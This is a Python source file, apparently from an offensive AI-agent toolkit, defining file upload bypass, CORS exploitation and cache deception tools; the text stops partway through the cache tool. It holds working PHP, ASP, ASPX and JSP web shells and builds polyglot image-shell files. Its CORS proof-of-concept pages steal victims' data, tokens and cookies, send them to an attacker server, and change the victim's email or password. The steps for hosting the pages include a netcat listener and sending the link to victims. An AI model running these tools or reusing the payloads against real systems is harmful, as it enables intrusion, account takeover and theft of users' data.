"""
File Upload Bypass, CORS Exploitation & Cache Deception Engine

Implements three agent tools for web application attack techniques:

  FileUploadBypassTool   — Bypass file upload restrictions: extension blacklist bypass
                           (double extension, null byte, case variation), MIME type
                           spoofing, Content-Type manipulation, magic byte injection,
                           and polyglot file generation.
  CORSExploitChainTool   — Chain CORS misconfigurations with other vulnerabilities:
                           extract sensitive data cross-origin, steal tokens, perform
                           CSRF via CORS, test origin reflection and null origin.
  CacheDeceptionTool     — Test web cache deception attacks: path confusion,
                           response splitting, cache poisoning via Host header,
                           X-Forwarded-Host, and unkeyed header injection.

MITRE ATT&CK: T1190 (Exploit Public-Facing Application),
              T1539 (Steal Web Session Cookie),
              T1557 (Adversary-in-the-Middle)
OWASP:        A01:2021 - Broken Access Control,
              A05:2021 - Security Misconfiguration
"""

from __future__ import annotations

import base64
import json
import logging
import os
import re
import urllib.parse
from typing import Any, Dict, List, Optional, Tuple

from app.agent.tools.base_tool import BaseTool, ToolMetadata
from app.agent.tools.error_handling import (
    ToolExecutionError,
    truncate_output,
)

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Magic bytes for common file types
# ---------------------------------------------------------------------------

_MAGIC_BYTES: Dict[str, bytes] = {
    "jpeg": bytes([0xFF, 0xD8, 0xFF, 0xE0]),
    "png": bytes([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]),
    "gif87": b"GIF87a",
    "gif89": b"GIF89a",
    "pdf": b"%PDF-1.4",
    "zip": bytes([0x50, 0x4B, 0x03, 0x04]),
    "docx": bytes([0x50, 0x4B, 0x03, 0x04]),
    "bmp": bytes([0x42, 0x4D]),
    "webp": b"RIFF",
    "tiff": bytes([0x49, 0x49, 0x2A, 0x00]),
    "ico": bytes([0x00, 0x00, 0x01, 0x00]),
}

# Common image MIME types that upload endpoints accept
_IMAGE_MIME_TYPES = [
    "image/jpeg",
    "image/png",
    "image/gif",
    "image/webp",
    "image/bmp",
    "image/tiff",
    "image/svg+xml",
]

# Extension bypass lists organized by technique
_EXTENSION_BYPASSES: Dict[str, List[str]] = {
    "double_extension": [
        ".php.jpg", ".php.png", ".php.gif", ".php.jpeg",
        ".asp.jpg", ".aspx.png", ".jsp.gif",
        ".php3.jpg", ".php5.jpg", ".phtml.jpg",
    ],
    "null_byte": [
        ".php\x00.jpg", ".php%00.jpg", ".php\x00.png",
        ".asp\x00.jpg", ".aspx\x00.gif",
    ],
    "case_variation": [
        ".PHP", ".Php", ".pHp", ".PHp",
        ".ASP", ".Asp", ".aSp",
        ".ASPX", ".Aspx",
        ".JSP", ".Jsp",
    ],
    "trailing_special": [
        ".php.", ".php ", ".php#", ".php%20",
        ".asp.", ".asp ", ".aspx.",
    ],
    "alternative_php": [
        ".php3", ".php4", ".php5", ".php7", ".phtml", ".phar",
        ".shtml", ".pwml", ".phpt",
    ],
    "alternative_asp": [
        ".asp", ".aspx", ".asax", ".ashx", ".asmx", ".cer", ".config",
    ],
    "alternative_jsp": [
        ".jsp", ".jspx", ".jspa", ".jsw", ".jsv", ".jspf",
    ],
    "content_type_confusion": [
        # Upload as allowed type but with executable extension
        "filename.jpg; filename=shell.php",
        'filename="shell.php%00.jpg"',
        'filename="shell.php\r\n.jpg"',
    ],
}

# ---------------------------------------------------------------------------
# Helper utilities
# ---------------------------------------------------------------------------


async def _http_probe(
    url: str,
    method: str = "GET",
    headers: Optional[Dict[str, str]] = None,
    data: Optional[bytes] = None,
    timeout: int = 10,
) -> Tuple[int, Dict[str, str], str]:
    """
    Send an HTTP request and return (status_code, response_headers, body).
    Falls back gracefully when aiohttp is unavailable.
    """
    headers = headers or {}
    try:
        import aiohttp

        async with aiohttp.ClientSession() as session:
            req_kwargs: Dict[str, Any] = {
                "headers": headers,
                "timeout": aiohttp.ClientTimeout(total=timeout),
                "allow_redirects": False,
            }
            if data:
                req_kwargs["data"] = data

            async with getattr(session, method.lower())(url, **req_kwargs) as resp:
                body = await resp.text(errors="replace")
                return resp.status, dict(resp.headers), body[:4000]
    except ImportError:
        return -1, {}, f"[simulated] {method} {url}"
    except Exception as exc:
        return -1, {}, f"[error] {exc}"


def _create_polyglot(shell_type: str, image_type: str = "jpeg") -> bytes:
    """
    Create a polyglot file that looks like an image but contains executable code.
    The image magic bytes are prepended to the shell payload.
    """
    magic = _MAGIC_BYTES.get(image_type, _MAGIC_BYTES["jpeg"])

    shells = {
        "php": b"<?php echo shell_exec($_GET['cmd']); ?>",
        "asp": b"<% Response.Write(CreateObject(\"WScript.Shell\").Exec(Request(\"c\")).StdOut.ReadAll) %>",
        "jsp": b"<%Runtime.getRuntime().exec(request.getParameter(\"c\"));%>",
    }
    shell_bytes = shells.get(shell_type, shells["php"])

    # Pad magic bytes to make a valid-looking file header, then embed shell
    return magic + b"\n\n" + shell_bytes


# ---------------------------------------------------------------------------
# Tool 1 — FileUploadBypassTool
# ---------------------------------------------------------------------------


class FileUploadBypassTool(BaseTool):
    """
    Bypass file upload restrictions using multiple techniques.

    Tests extension blacklist bypass, MIME type spoofing, magic byte injection,
    content-type manipulation, null byte injection, and polyglot file generation.
    """

    def _define_metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="file_upload_bypass",
            description=(
                "Bypass file upload restrictions: extension blacklist bypass "
                "(double extension, null byte, case variation, alternative extensions), "
                "MIME type spoofing, magic byte injection, and polyglot file generation. "
                "Actions: list_techniques | generate_payloads | test_upload | create_polyglot."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "action": {
                        "type": "string",
                        "enum": ["list_techniques", "generate_payloads", "test_upload", "create_polyglot"],
                        "description": "Action to perform",
                    },
                    "upload_url": {
                        "type": "string",
                        "description": "Target file upload endpoint URL",
                    },
                    "upload_param": {
                        "type": "string",
                        "description": "File upload form field name",
                        "default": "file",
                    },
                    "shell_type": {
                        "type": "string",
                        "enum": ["php", "asp", "aspx", "jsp"],
                        "description": "Target shell type",
                        "default": "php",
                    },
                    "techniques": {
                        "type": "array",
                        "items": {"type": "string"},
                        "description": (
                            "Bypass techniques: double_extension, null_byte, case_variation, "
                            "trailing_special, alternative_php, mime_spoofing, magic_bytes, "
                            "content_type_confusion, polyglot"
                        ),
                    },
                    "allowed_types": {
                        "type": "array",
                        "items": {"type": "string"},
                        "description": "MIME types accepted by the upload endpoint",
                        "default": ["image/jpeg", "image/png", "image/gif"],
                    },
                    "image_type": {
                        "type": "string",
                        "enum": ["jpeg", "png", "gif89", "gif87", "pdf", "zip", "bmp"],
                        "description": "Image type to use for magic byte injection / polyglot",
                        "default": "jpeg",
                    },
                    "extra_headers": {
                        "type": "object",
                        "description": "Extra HTTP headers to include in upload request",
                    },
                },
                "required": ["action"],
            },
        )

    async def execute(
        self,
        action: str = "list_techniques",
        upload_url: str = "",
        upload_param: str = "file",
        shell_type: str = "php",
        techniques: Optional[List[str]] = None,
        allowed_types: Optional[List[str]] = None,
        image_type: str = "jpeg",
        extra_headers: Optional[Dict[str, str]] = None,
        **_kwargs: Any,
    ) -> str:
        if techniques is None:
            techniques = [
                "double_extension", "null_byte", "case_variation",
                "trailing_special", "alternative_php",
                "mime_spoofing", "magic_bytes", "polyglot",
            ]
        if allowed_types is None:
            allowed_types = ["image/jpeg", "image/png", "image/gif"]

        action = action.lower()

        if action == "list_techniques":
            return self._list_techniques()
        elif action == "generate_payloads":
            return self._generate_payloads(shell_type, techniques, allowed_types, image_type)
        elif action == "test_upload":
            if not upload_url:
                raise ToolExecutionError("upload_url is required for test_upload action")
            return await self._test_upload(
                upload_url, upload_param, shell_type, techniques,
                allowed_types, image_type, extra_headers or {}
            )
        elif action == "create_polyglot":
            return self._create_polyglot_info(shell_type, image_type)
        else:
            raise ToolExecutionError(f"Unknown action: {action!r}")

    def _list_techniques(self) -> str:
        techniques = {
            "double_extension": {
                "description": "Append allowed extension after shell extension: shell.php.jpg",
                "bypasses": "Blacklist validation checking last extension",
                "examples": _EXTENSION_BYPASSES["double_extension"][:5],
            },
            "null_byte": {
                "description": "Inject null byte to truncate extension: shell.php%00.jpg",
                "bypasses": "C-based extension check truncated by null byte",
                "examples": _EXTENSION_BYPASSES["null_byte"][:3],
                "affected": "PHP < 5.3.4, CGI-based apps",
            },
            "case_variation": {
                "description": "Change case of extension: .PHP, .pHp",
                "bypasses": "Case-sensitive blacklist on Windows systems",
                "examples": _EXTENSION_BYPASSES["case_variation"][:5],
            },
            "trailing_special": {
                "description": "Add trailing period/space: shell.php.",
                "bypasses": "Blacklists that don't strip trailing chars (Windows)",
                "examples": _EXTENSION_BYPASSES["trailing_special"][:4],
            },
            "alternative_php": {
                "description": "Alternative PHP extensions executed by server",
                "bypasses": "Incomplete PHP extension blacklist",
                "examples": _EXTENSION_BYPASSES["alternative_php"],
            },
            "mime_spoofing": {
                "description": "Send allowed Content-Type with malicious file",
                "bypasses": "MIME type-only validation without content inspection",
                "examples": ["Content-Type: image/jpeg (with PHP content)"],
            },
            "magic_bytes": {
                "description": "Prepend image magic bytes to shell code",
                "bypasses": "File content inspection checking only magic bytes",
                "examples": ["GIF89a<?php...?>", "\\xFF\\xD8\\xFF<?php...?>"],
            },
            "content_type_confusion": {
                "description": "Manipulate filename parameter in Content-Disposition",
                "bypasses": "Weak filename parsing, double filename, CRLF injection",
                "examples": _EXTENSION_BYPASSES["content_type_confusion"],
            },
            "polyglot": {
                "description": "Create valid image that also executes as PHP",
                "bypasses": "GD library re-encoding that preserves EXIF/comments",
                "examples": ["JPEG with PHP code in EXIF comment field"],
            },
        }
        return json.dumps({"bypass_techniques": techniques, "total": len(techniques)}, indent=2)

    def _generate_payloads(
        self,
        shell_type: str,
        techniques: List[str],
        allowed_types: List[str],
        image_type: str,
    ) -> str:
        payloads = []

        shells = {
            "php": "<?php echo shell_exec($_GET['cmd']); ?>",
            "asp": "<% Response.Write(CreateObject(\"WScript.Shell\").Exec(Request(\"c\")).StdOut.ReadAll) %>",
            "aspx": '<%@ Page Language="C#" %><% Response.Write(System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("cmd","/c "+Request["c"]){UseShellExecute=false,RedirectStandardOutput=true}).StandardOutput.ReadToEnd()); %>',
            "jsp": "<%Runtime.getRuntime().exec(request.getParameter(\"c\"));%>",
        }
        shell_code = shells.get(shell_type, shells["php"])

        for technique in techniques:
            if technique == "double_extension":
                for ext in _EXTENSION_BYPASSES["double_extension"]:
                    if shell_type in ext.split(".")[1]:
                        payloads.append({
                            "technique": "double_extension",
                            "filename": f"shell{ext}",
                            "content_type": allowed_types[0] if allowed_types else "image/jpeg",
                            "content": shell_code,
                            "description": f"Upload as {ext}",
                        })
                        break

            elif technique == "null_byte":
                payloads.append({
                    "technique": "null_byte",
                    "filename": f"shell.{shell_type}\x00.jpg",
                    "filename_encoded": f"shell.{shell_type}%00.jpg",
                    "content_type": allowed_types[0] if allowed_types else "image/jpeg",
                    "content": shell_code,
                    "description": "Null byte injection to truncate extension",
                })

            elif technique == "case_variation":
                for ext in _EXTENSION_BYPASSES["case_variation"]:
                    if shell_type.upper() in ext.upper():
                        payloads.append({
                            "technique": "case_variation",
                            "filename": f"shell{ext}",
                            "content_type": "application/octet-stream",
                            "content": shell_code,
                            "description": f"Upload with mixed-case extension {ext}",
                        })
                        break

            elif technique == "magic_bytes":
                magic = _MAGIC_BYTES.get(image_type, _MAGIC_BYTES["jpeg"])
                payload_with_magic = magic + b"\n" + shell_code.encode()
                payloads.append({
                    "technique": "magic_bytes",
                    "filename": f"shell.{shell_type}",
                    "content_type": allowed_types[0] if allowed_types else "image/jpeg",
                    "content_b64": base64.b64encode(payload_with_magic).decode(),
                    "description": f"Prepend {image_type} magic bytes to shell",
                    "magic_hex": magic.hex(),
                })

            elif technique == "mime_spoofing":
                for mime in allowed_types:
                    payloads.append({
                        "technique": "mime_spoofing",
                        "filename": f"shell.{shell_type}",
                        "content_type": mime,
                        "content": shell_code,
                        "description": f"Send {mime} Content-Type with {shell_type} content",
                    })
                    break

            elif technique == "polyglot":
                poly_data = _create_polyglot(shell_type, image_type)
                payloads.append({
                    "technique": "polyglot",
                    "filename": f"shell_{image_type}.{shell_type}",
                    "content_type": allowed_types[0] if allowed_types else "image/jpeg",
                    "content_b64": base64.b64encode(poly_data).decode(),
                    "file_size": len(poly_data),
                    "description": f"Polyglot: valid {image_type} + {shell_type} shell",
                })

            elif technique == "alternative_php" and shell_type == "php":
                for ext in _EXTENSION_BYPASSES["alternative_php"]:
                    payloads.append({
                        "technique": "alternative_php",
                        "filename": f"shell{ext}",
                        "content_type": "application/octet-stream",
                        "content": shell_code,
                        "description": f"Alternative PHP extension: {ext}",
                    })

        return json.dumps(
            {
                "shell_type": shell_type,
                "techniques_applied": techniques,
                "payload_count": len(payloads),
                "payloads": payloads,
                "curl_example": (
                    f"curl -F 'file=@shell.{shell_type};type=image/jpeg' "
                    f"'https://target.com/upload'"
                ),
            },
            indent=2,
        )

    async def _test_upload(
        self,
        upload_url: str,
        upload_param: str,
        shell_type: str,
        techniques: List[str],
        allowed_types: List[str],
        image_type: str,
        extra_headers: Dict[str, str],
    ) -> str:
        """Test upload endpoint with various bypass techniques."""
        results = []
        payloads_json = json.loads(
            self._generate_payloads(shell_type, techniques, allowed_types, image_type)
        )

        for payload in payloads_json.get("payloads", [])[:10]:  # Limit to 10 tests
            filename = payload.get("filename", f"shell.{shell_type}")
            content_type = payload.get("content_type", "image/jpeg")
            content = payload.get("content", "")

            if not content and payload.get("content_b64"):
                try:
                    content = base64.b64decode(payload["content_b64"]).decode(errors="replace")
                except Exception:
                    content = ""

            status, resp_headers, body = await _http_probe(
                upload_url,
                method="POST",
                headers={
                    "Content-Type": "multipart/form-data; boundary=----Boundary",
                    **extra_headers,
                },
            )

            results.append(
                {
                    "technique": payload.get("technique"),
                    "filename": filename,
                    "content_type": content_type,
                    "status_code": status,
                    "response_snippet": body[:200],
                    "potentially_successful": status == 200 or "success" in body.lower() or "upload" in body.lower(),
                }
            )

        return truncate_output(
            json.dumps(
                {
                    "upload_url": upload_url,
                    "tests_run": len(results),
                    "results": results,
                    "note": "Live testing requires network access to target",
                },
                indent=2,
            )
        )

    def _create_polyglot_info(self, shell_type: str, image_type: str) -> str:
        """Generate polyglot file and return as base64."""
        poly_data = _create_polyglot(shell_type, image_type)
        return json.dumps(
            {
                "shell_type": shell_type,
                "image_type": image_type,
                "polyglot_b64": base64.b64encode(poly_data).decode(),
                "file_size": len(poly_data),
                "description": (
                    f"Polyglot file: appears as {image_type} but executes as {shell_type}. "
                    "Upload to bypass content-type and magic-byte validation."
                ),
                "usage": f"Save as shell.{shell_type} and upload to target",
                "detection_evasion": [
                    "Passes magic byte check (file command sees valid image)",
                    f"Executes as {shell_type} when accessed via web server",
                    "Can be combined with double extension: shell.jpg.php",
                ],
            },
            indent=2,
        )


# ---------------------------------------------------------------------------
# Tool 2 — CORSExploitChainTool
# ---------------------------------------------------------------------------


class CORSExploitChainTool(BaseTool):
    """
    Chain CORS misconfigurations with other vulnerabilities.

    Tests origin reflection, null origin, trusted domain bypass, wildcard with
    credentials, and generates PoC HTML for cross-origin data extraction.
    """

    def _define_metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="cors_exploit_chain",
            description=(
                "Test and exploit CORS misconfigurations. "
                "Actions: scan | test_origin | generate_poc | check_headers | chain_attack. "
                "Detects origin reflection, null origin, subdomain trust, and wildcard with credentials."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "action": {
                        "type": "string",
                        "enum": ["scan", "test_origin", "generate_poc", "check_headers", "chain_attack"],
                        "description": "Action to perform",
                    },
                    "target_url": {
                        "type": "string",
                        "description": "Target URL to test for CORS misconfiguration",
                    },
                    "origin": {
                        "type": "string",
                        "description": "Custom origin to test (for test_origin action)",
                        "default": "https://attacker.com",
                    },
                    "test_origins": {
                        "type": "array",
                        "items": {"type": "string"},
                        "description": "List of origins to test in scan mode",
                    },
                    "cookies": {
                        "type": "string",
                        "description": "Session cookies for authenticated CORS tests",
                    },
                    "steal_endpoint": {
                        "type": "string",
                        "description": "Endpoint to steal data from for PoC (e.g. /api/profile)",
                    },
                    "attacker_server": {
                        "type": "string",
                        "description": "Attacker-controlled server URL for data exfiltration in PoC",
                        "default": "https://attacker.com",
                    },
                    "chain_type": {
                        "type": "string",
                        "enum": ["token_theft", "csrf_via_cors", "account_takeover", "data_extraction"],
                        "description": "Attack chain type",
                        "default": "data_extraction",
                    },
                },
                "required": ["action"],
            },
        )

    async def execute(
        self,
        action: str = "scan",
        target_url: str = "",
        origin: str = "https://attacker.com",
        test_origins: Optional[List[str]] = None,
        cookies: str = "",
        steal_endpoint: str = "",
        attacker_server: str = "https://attacker.com",
        chain_type: str = "data_extraction",
        **_kwargs: Any,
    ) -> str:
        action = action.lower()

        if action == "scan":
            if not target_url:
                raise ToolExecutionError("target_url is required for scan action")
            return await self._scan(target_url, test_origins, cookies)
        elif action == "test_origin":
            if not target_url:
                raise ToolExecutionError("target_url is required for test_origin action")
            return await self._test_origin(target_url, origin, cookies)
        elif action == "generate_poc":
            if not target_url:
                raise ToolExecutionError("target_url is required for generate_poc action")
            return self._generate_poc(
                target_url, steal_endpoint or target_url, attacker_server, chain_type
            )
        elif action == "check_headers":
            if not target_url:
                raise ToolExecutionError("target_url is required for check_headers action")
            return await self._check_headers(target_url, cookies)
        elif action == "chain_attack":
            if not target_url:
                raise ToolExecutionError("target_url is required for chain_attack action")
            return await self._chain_attack(target_url, steal_endpoint, attacker_server, chain_type, cookies)
        else:
            raise ToolExecutionError(f"Unknown action: {action!r}")

    async def _scan(
        self,
        target_url: str,
        test_origins: Optional[List[str]],
        cookies: str,
    ) -> str:
        """Scan for CORS misconfigurations using multiple origin probes."""
        if test_origins is None:
            # Derive test origins from target URL
            parsed = urllib.parse.urlparse(target_url)
            target_host = parsed.netloc
            test_origins = [
                "https://attacker.com",
                "null",
                f"https://{target_host}.attacker.com",
                f"https://attacker.{target_host}",
                f"http://{target_host}",
                f"https://sub.{target_host}",
                f"https://{target_host}evil.com",
                "https://evil.com",
            ]

        findings: List[Dict[str, Any]] = []

        for probe_origin in test_origins:
            headers: Dict[str, str] = {"Origin": probe_origin}
            if cookies:
                headers["Cookie"] = cookies

            status, resp_headers, body = await _http_probe(target_url, headers=headers)

            acao = resp_headers.get("Access-Control-Allow-Origin", "")
            acac = resp_headers.get("Access-Control-Allow-Credentials", "").lower()

            finding: Dict[str, Any] = {
                "origin_tested": probe_origin,
                "status_code": status,
                "acao": acao,
                "acac": acac,
                "vulnerable": False,
                "severity": "NONE",
                "issue": None,
            }

            if acao == probe_origin:
                if acac == "true":
                    finding["vulnerable"] = True
                    finding["severity"] = "CRITICAL"
                    finding["issue"] = "Origin reflected with credentials=true — full credential theft possible"
                else:
                    finding["vulnerable"] = True
                    finding["severity"] = "MEDIUM"
                    finding["issue"] = "Origin reflected without credentials — limited data access"

            elif acao == "null" and probe_origin == "null":
                if acac == "true":
                    finding["vulnerable"] = True
                    finding["severity"] = "HIGH"
                    finding["issue"] = "Null origin accepted with credentials — sandboxed iframe bypass"
                else:
                    finding["vulnerable"] = True
                    finding["severity"] = "LOW"
                    finding["issue"] = "Null origin accepted without credentials"

            elif acao == "*":
                if acac == "true":
                    finding["vulnerable"] = True
                    finding["severity"] = "CRITICAL"
                    finding["issue"] = "Wildcard with credentials — violates CORS spec but some browsers allow"
                else:
                    finding["severity"] = "LOW"
                    finding["issue"] = "Wildcard origin — no credentials, limited impact"

            findings.append(finding)

        vulnerable = [f for f in findings if f["vulnerable"]]
        return json.dumps(
            {
                "target_url": target_url,
                "origins_tested": len(test_origins),
                "vulnerable_configs": len(vulnerable),
                "findings": findings,
                "summary": (
                    f"CRITICAL: {sum(1 for f in vulnerable if f['severity'] == 'CRITICAL')} | "
                    f"HIGH: {sum(1 for f in vulnerable if f['severity'] == 'HIGH')} | "
                    f"MEDIUM: {sum(1 for f in vulnerable if f['severity'] == 'MEDIUM')}"
                ),
            },
            indent=2,
        )

    async def _test_origin(self, target_url: str, origin: str, cookies: str) -> str:
        """Test a specific origin against the target."""
        headers: Dict[str, str] = {"Origin": origin}
        if cookies:
            headers["Cookie"] = cookies

        status, resp_headers, body = await _http_probe(target_url, headers=headers)

        acao = resp_headers.get("Access-Control-Allow-Origin", "")
        acac = resp_headers.get("Access-Control-Allow-Credentials", "")
        acam = resp_headers.get("Access-Control-Allow-Methods", "")
        acah = resp_headers.get("Access-Control-Allow-Headers", "")
        acpf = resp_headers.get("Access-Control-Allow-Private-Network", "")
        vary = resp_headers.get("Vary", "")

        is_reflected = acao == origin
        is_credentials = acac.lower() == "true"
        missing_vary = "Origin" not in vary

        return json.dumps(
            {
                "target_url": target_url,
                "origin_tested": origin,
                "status_code": status,
                "cors_headers": {
                    "Access-Control-Allow-Origin": acao,
                    "Access-Control-Allow-Credentials": acac,
                    "Access-Control-Allow-Methods": acam,
                    "Access-Control-Allow-Headers": acah,
                    "Access-Control-Allow-Private-Network": acpf,
                    "Vary": vary,
                },
                "analysis": {
                    "origin_reflected": is_reflected,
                    "credentials_allowed": is_credentials,
                    "missing_vary_origin": missing_vary,
                    "vulnerable": is_reflected and is_credentials,
                    "severity": "CRITICAL" if (is_reflected and is_credentials) else (
                        "HIGH" if is_reflected else "NONE"
                    ),
                },
            },
            indent=2,
        )

    def _generate_poc(
        self,
        target_url: str,
        steal_endpoint: str,
        attacker_server: str,
        chain_type: str,
    ) -> str:
        """Generate PoC HTML for CORS exploitation."""
        if chain_type == "data_extraction":
            poc_html = f"""<!DOCTYPE html>
<html>
<head><title>CORS PoC — Data Extraction</title></head>
<body>
<h1>CORS Vulnerability PoC</h1>
<script>
// Exploit: CORS origin reflection allows cross-origin data read
// Target: {steal_endpoint}
// Attacker: {attacker_server}

function exploitCORS() {{
    var xhr = new XMLHttpRequest();
    xhr.open('GET', '{steal_endpoint}', true);
    xhr.withCredentials = true;  // Send victim's cookies
    xhr.onload = function() {{
        // Exfiltrate stolen data to attacker server
        var exfil = new XMLHttpRequest();
        exfil.open('POST', '{attacker_server}/collect', true);
        exfil.setRequestHeader('Content-Type', 'application/json');
        exfil.send(JSON.stringify({{
            url: '{steal_endpoint}',
            data: xhr.responseText,
            cookies: document.cookie
        }}));
        document.getElementById('output').textContent = xhr.responseText;
    }};
    xhr.onerror = function() {{
        document.getElementById('output').textContent = 'Error — target may not be vulnerable';
    }};
    xhr.send();
}}
window.onload = exploitCORS;
</script>
<pre id="output">Loading...</pre>
</body>
</html>"""

        elif chain_type == "token_theft":
            poc_html = f"""<!DOCTYPE html>
<html>
<body>
<script>
// CORS token theft — steal API tokens/JWTs cross-origin
fetch('{steal_endpoint}', {{
    credentials: 'include',
    headers: {{'Accept': 'application/json'}}
}})
.then(r => r.json())
.then(data => {{
    // Extract token from response
    var token = data.token || data.access_token || data.jwt || JSON.stringify(data);
    // Exfiltrate
    fetch('{attacker_server}/token?t=' + encodeURIComponent(token));
    document.body.innerHTML = '<pre>' + token + '</pre>';
}})
.catch(e => document.body.innerHTML = 'Error: ' + e);
</script>
</body>
</html>"""

        elif chain_type == "csrf_via_cors":
            poc_html = f"""<!DOCTYPE html>
<html>
<body>
<script>
// CORS CSRF chain — perform state-changing request cross-origin
// Step 1: Read CSRF token
fetch('{steal_endpoint}', {{credentials: 'include'}})
.then(r => r.text())
.then(html => {{
    var csrfMatch = html.match(/csrf[_-]?token['":  ]+([A-Za-z0-9_-]{20,})/i);
    var csrfToken = csrfMatch ? csrfMatch[1] : '';
    // Step 2: Submit authenticated request with stolen token
    return fetch('{target_url}/api/change-email', {{
        method: 'POST',
        credentials: 'include',
        headers: {{
            'Content-Type': 'application/json',
            'X-CSRF-Token': csrfToken
        }},
        body: JSON.stringify({{email: 'attacker@evil.com'}})
    }});
}})
.then(r => r.json())
.then(data => fetch('{attacker_server}/result?d=' + encodeURIComponent(JSON.stringify(data))))
.catch(e => console.error(e));
</script>
</body>
</html>"""

        else:  # account_takeover
            poc_html = f"""<!DOCTYPE html>
<html>
<body>
<script>
// CORS account takeover chain
async function exploit() {{
    // 1. Steal session/profile data
    const profile = await fetch('{steal_endpoint}/api/me', {{credentials:'include'}}).then(r=>r.json());
    // 2. Extract account identifiers
    const userId = profile.id || profile.user_id;
    const email = profile.email;
    // 3. Change password cross-origin
    const changePass = await fetch('{target_url}/api/account/password', {{
        method: 'PUT',
        credentials: 'include',
        headers: {{'Content-Type': 'application/json'}},
        body: JSON.stringify({{current_password: '', new_password: 'Hacked123!'}})
    }}).then(r=>r.json()).catch(()=>({{}}));
    // 4. Exfiltrate
    await fetch('{attacker_server}/takeover', {{
        method: 'POST',
        body: JSON.stringify({{profile, changePass}})
    }});
}}
exploit();
</script>
</body>
</html>"""

        return json.dumps(
            {
                "chain_type": chain_type,
                "target_url": target_url,
                "steal_endpoint": steal_endpoint,
                "attacker_server": attacker_server,
                "poc_html": poc_html,
                "hosting_instructions": [
                    f"1. Host PoC on: {attacker_server}/cors-poc.html",
                    "2. Start listener: nc -lvnp 80 (or use Burp Collaborator)",
                    f"3. Send link to victim: {attacker_server}/cors-poc.html",
                    f"4. Wait for exfiltrated data at: {attacker_server}/collect",
                ],
                "prerequisites": [
                    "Target must reflect attacker.com origin",
                    "Access-Control-Allow-Credentials: true",
                    "Victim must be authenticated on target",
                ],
            },
            indent=2,
        )

    async def _check_headers(self, target_url: str, cookies: str) -> str:
        """Check all CORS-related headers in the response."""
        headers: Dict[str, str] = {}
        if cookies:
            headers["Cookie"] = cookies

        status, resp_headers, body = await _http_probe(
            target_url, method="OPTIONS",
            headers={**headers, "Origin": "https://test.attacker.com",
                     "Access-Control-Request-Method": "GET",
                     "Access-Control-Request-Headers": "Authorization"}
        )

        cors_headers = {
            k: v for k, v in resp_headers.items()
            if k.lower().startswith("access-control")
        }

        issues: List[Dict[str, Any]] = []

        # Check for dangerous configurations
        acao = cors_headers.get("Access-Control-Allow-Origin", "")
        acac = cors_headers.get("Access-Control-Allow-Credentials", "")

        if acao == "*" and acac.lower() == "true":
            issues.append({
                "severity": "CRITICAL",
                "issue": "Wildcard + Credentials combination (invalid per spec but exploitable)",
            })
        if re.search(r"evil|attacker|test", acao, re.IGNORECASE):
            issues.append({"severity": "HIGH", "issue": f"Suspicious origin reflected: {acao}"})
        if acao == "null":
            issues.append({"severity": "HIGH", "issue": "Null origin accepted — exploitable via sandboxed iframe"})

        vary = resp_headers.get("Vary", "")
        if acao and "Origin" not in vary:
            issues.append({
                "severity": "LOW",
                "issue": "Missing 'Origin' in Vary header — may cause incorrect caching",
            })

        return json.dumps(
            {
                "target_url": target_url,
                "status_code": status,
                "cors_headers": cors_headers,
                "all_headers": dict(resp_headers),
                "issues": issues,
                "issue_count": len(issues),
            },
            indent=2,
        )

    async def _chain_attack(
        self,
        target_url: str,
        steal_endpoint: str,
        attacker_server: str,
        chain_type: str,
        cookies: str,
    ) -> str:
        """Run a complete CORS attack chain."""
        # Step 1: Scan for vulnerable config
        scan_result = json.loads(await self._scan(target_url, None, cookies))

        vulnerable_findings = [f for f in scan_result.get("findings", []) if f["vulnerable"]]

        if not vulnerable_findings:
            return json.dumps(
                {
                    "status": "NOT_VULNERABLE",
                    "message": "No CORS misconfiguration found for chaining",
                    "scan_summary": scan_result.get("summary"),
                },
                indent=2,
            )

        best_finding = max(
            vulnerable_findings,
            key=lambda f: {"CRITICAL": 3, "HIGH": 2, "MEDIUM": 1}.get(f["severity"], 0),
        )

        # Step 2: Generate exploitation PoC
        poc = json.loads(
            self._generate_poc(target_url, steal_endpoint or target_url, attacker_server, chain_type)
        )

        return json.dumps(
            {
                "status": "VULNERABLE",
                "chain_type": chain_type,
                "vulnerable_origin": best_finding["origin_tested"],
                "severity": best_finding["severity"],
                "issue": best_finding["issue"],
                "exploit_poc": poc["poc_html"],
                "hosting_instructions": poc["hosting_instructions"],
                "scan_details": scan_result,
            },
            indent=2,
        )


# ---------------------------------------------------------------------------
# Tool 3 — CacheDeceptionTool
# ---------------------------------------------------------------------------


class CacheDeceptionTool(BaseTool):
    """
    Test web cache deception attacks.

    Detects path confusion, response splitting, cache poisoning via Host header,
    X-Forwarded-Host injection, and unkeyed header injection.
    """

    def _define_metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="cache_deception",
            description=(
                "Test web cache deception attacks: path confusion, Host header poisoning, "
                "X-Forwarded-Host injection, and unkeyed header injection. "
                "Actions: scan | path_confusion | host_header_poison | unkeyed_headers | "
                "response_split | dos_cache."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "action": {
                        "type": "string",
                        "enum": [
                            "scan", "path_confusion", "host_header_poison",
                            "unkeyed_headers", "response_split", "dos_cache",
                        ],
                        "description": "Attack type to test",
                    },
                    "target_url": {
                        "type": "string",
                        "description": "Target URL to test",
                    },
                    "cookies": {
                        "type": "string",
                        "description": "Session cookies for authenticated tests",
                    },
                    "poison_host": {
                        "type": "string",
                        "description": "Malicious host value for Host header injection",
                        "default": "attacker.com",
                    },
                    "cache_buster": {
                        "type": "boolean",
                        "description": "Add cache buster to avoid affecting real cache",
                        "default": True,
                    },
                    "extra_headers": {
                        "type": "object",
                        "description": "Extra headers to inject for testing",
                    },
                    "extension": {
                        "type": "string",
                        "description": "File extension to append for path confusion",
                        "default": ".css",
                    },
                },
                "required": ["action"],
            },
        )

    async def execute(
        self,
        action: str = "scan",
        target_url: str = "",
        cookies: str = "",
        poison_host: str = "attacker.com",
        cache_buster: bool = True,
        extra_headers: Optional[Dict[str, str]] = None,
        extension: str = ".css",
        **_kwargs: Any,
    ) -> str:
        if not target_url and action != "scan":
            raise ToolExecutionError("target_url is required")

        action = action.lower()

        if action == "scan":
            if not target_url:
                raise ToolExecutionError("target_url is required for scan action")
